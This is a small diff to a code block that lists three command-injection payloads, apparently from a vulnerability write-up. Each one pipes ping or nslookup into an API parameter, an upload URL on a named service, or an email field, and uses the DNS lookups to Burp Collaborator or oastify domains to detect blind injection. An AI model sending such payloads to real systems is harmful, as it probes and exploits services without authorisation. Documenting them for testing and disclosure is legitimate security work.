@@ -60,5 +60,5 @@ Example-01: /api/v1/pdf/generate_zip?seed_id=521b62f5b7132de722027388|ping -n 21
 
 Example-02: https://api.seedr.ru/uploads/521b62f5b7132de722027388|nslookup -q=cname 0vwm3493ytajvrc4a2g7ptfmgdm7a04o0crzhn6.burpcollaborator.net.&.zip
 
-Example-03: email=a%40a.com|nslookup+-q%3dcname+6dkbk5sl74e1lw093edka1x3buhl5g34s.oastify.com.%26.zip
+Example-03: email=a@a.com|nslookup -q=cname 6dkbk5sl74e1lw093edka1x3buhl5g34s.oastify.com.&.zip
 ```
